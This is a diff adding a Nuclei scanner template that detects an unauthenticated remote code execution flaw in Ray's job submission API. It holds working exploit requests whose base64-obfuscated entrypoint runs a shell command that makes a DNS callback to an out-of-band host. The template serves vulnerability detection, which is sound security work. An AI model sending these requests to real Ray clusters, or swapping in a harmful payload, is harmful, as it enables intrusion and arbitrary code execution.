@@ -1,0 +1,48 @@
+id: ray-job-rce
+
+info:
+  name: Ray RCE via Agent Jobs
+  author: Sierra Bearchell (Vuln Discovery), byt3bl33d3r (Nuclei Template)
+  severity: critical
+  description: RCE in Ray via the agent job submission endpoint. This is intended functionality as Ray's main purpose is executing arbitrary workloads. By default Ray has no authentication.
+  reference:
+    - https://huntr.com/bounties/b507a6a0-c61a-4508-9101-fceb572b0385/
+    - https://huntr.com/bounties/787a07c0-5535-469f-8c53-3efa4e5717c7/
+  tags: ray,ml,huntr,protectai
+
+variables:
+  python_payload: "python3 -c 'import socket;socket.gethostbyname(\"{{interactsh-url}}\")'"
+
+http:
+  - raw:
+      # Newer versions of the Ray API
+      - |
+        POST /api/jobs/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"entrypoint": "echo {{base64(python_payload)}}|base64$IFS-d|sh"}
+
+      # Older versions of the Ray API
+      - |
+        POST /api/job_agent/jobs/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"entrypoint": "echo {{base64(python_payload)}}|base64$IFS-d|sh"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms dns Interaction
+        words:
+          - "dns"
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "job_id"
